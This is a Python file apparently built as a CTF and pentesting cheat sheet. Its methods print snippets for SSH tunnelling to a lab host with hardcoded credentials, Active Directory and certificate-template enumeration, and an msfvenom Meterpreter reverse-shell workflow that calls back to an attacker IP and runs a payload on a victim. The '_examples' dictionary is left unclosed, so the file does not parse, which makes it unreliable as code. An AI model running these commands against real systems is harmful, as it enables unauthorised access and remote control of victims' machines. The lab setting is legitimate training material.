class widgets:
    """
    Code scaffolds and workflow examples for CTF and pentesting.
    Use widgets.<topic>() to print the code example for that topic.
    Use widgets.summary() to list all available topics and their descriptions.
    """

    _examples = {
        "ssh_portforward_requests": {
            "desc": "SSH port forwarding with requests",
            "code": '''\
# SSH port forward, then use requests session
tokuproxy = ssh("nocturnal.htb", 22, username="tobias", password="slowmotionapocalypse")
pf = tokuproxy.portforward(9999, "localhost", 8080)
session = requests.Session()
session.headers["Host"] = "nocturnal.htb"
r = session.get("http://127.0.0.1:9999/index.php")
print(r.status_code)
pf.close()
'''
        },
        "socks_requests": {
            "desc": "Using SOCKS proxy with requests",
            "code": '''\
# Use a SOCKS proxy with requests
tokuproxy = ssh("nocturnal.htb", 22, username="tobias", password="slowmotionapocalypse")
sp = tokuproxy.socksproxy(9998)
session = requests.Session()
session.proxies = {"http": "socks5://127.0.0.1:9998", "https": "socks5://127.0.0.1:9998"}
session.headers["Host"] = "nocturnal.htb"
r = session.get("http://127.0.0.1:8080/index.php")
print(r.status_code)
sp.close()
'''
        },
        "chepy": {
            "desc": "Chepy encoding/decoding and AES",
            "code": '''\
# Chepy encoding/decoding and AES
inp = 'flaghere'
enc = Chepy(inp).rot_13().to_base64().str_to_hex()
print(enc)
dec = Chepy(str(enc)).hex_to_str().from_base64().rot_13()
print(dec)
aes_enc = Chepy("moreflag").aes_encrypt("secret password!", mode="ECB", key_format="str").o
print(aes_enc)
aes_dec = Chepy(aes_enc).aes_decrypt("secret password!", mode="ECB", key_format="str").o
print(aes_dec)
'''
        },
        "pwntools": {
            "desc": "Pwntools exploit script scaffold",
            "code": '''\
from pwn import *

context.update(arch='amd64')
context.terminal = ['ghostty', '-e']
exe = './'
elf = context.binary = ELF(exe, checksec=False)

def start(argv=[], *a, **kw):
    return process([exe] + argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
io.close()
'''
        },
        "windows_enum": {
            "desc": "Windows domain enumeration and BloodHound setup",
            "code": '''\
# --- BloodHound Docker quickstart ----
!mkdir -p ./bloodhounddumps
!docker compose --project-directory ~/.local/build/programs/bloodhound --progress quiet down
!docker compose --project-directory ~/.local/build/programs/bloodhound --progress quiet up -d
print("Connect to bloodhound at http://localhost:8080 (admin/bloodhound)")
print("For a full reset: docker compose down --volumes")

# --- Windows network/domain enumeration ----
!enum4linux-ng $target -u $initialuser -p $initialpassword
!smbclient -L //$target -U '{domain}/{initialuser}'%'{initialpassword}'
!bloodhound-python -u $initialuser -p $initialpassword -d $domain -dc $target -c All
!ldapsearch -x -H ldap://$target -D '{domain}\\{initialuser}' -w $initialpassword -b $domain_spn '(objectClass=person)'
!certipy find -u $initialuser -p $initialpassword -target $target -vulnerable -stdout
'''
        },
        "msfvenom": {
            "desc": "msfvenom/metasploit reverse shell workflow",
            "code": '''\
# --- msfvenom/meterpreter reverse shell workflow ---
# On attack box:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=9999 -f exe > shell.exe

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.28
msf6 exploit(multi/handler) > set lport 9999
msf6 exploit(multi/handler) > run

# On victim (e.g. Evil-WinRM):
PS C:\\Users\\user\\Downloads> ./shell.exe
'''
        },
        "ssh_exec": {
            "desc": "SSH command execution and output capture",
            "code": '''\
# SSH exec example: run a command and capture output
tokuproxy = ssh("nocturnal.htb", 22, username="tobias", password="slowmotionapocalypse")
out = tokuproxy.exec("whoami")
print("Remote user:", out)
# Optionally, run with sudo
out = tokuproxy.exec("id", sudo=True)
print("Remote id (sudo):", out)
'''
    }

    @classmethod
    def summary(cls):
        """
        List all available topics and their descriptions.
        """
        print("Available widgets (code scaffolds):\n")
        for k, v in cls._examples.items():
            print(f"  {k:>20} : {v['desc']}")
        print("\nUse widgets.<topic>() to print the code example for that topic.")

    @classmethod
    def ssh_portforward_requests(cls):
        print(cls._examples["ssh_portforward_requests"]["code"])

    @classmethod
    def socks_requests(cls):
        print(cls._examples["socks_requests"]["code"])

    @classmethod
    def chepy(cls):
        print(cls._examples["chepy"]["code"])

    @classmethod
    def pwntools(cls):
        print(cls._examples["pwntools"]["code"])

    @classmethod
    def windows_enum(cls):
        print(cls._examples["windows_enum"]["code"])

    @classmethod
    def msfvenom(cls):
        print(cls._examples["msfvenom"]["code"])
    @classmethod
    def ssh_exec(cls):
        print(cls._examples["ssh_exec"]["code"])
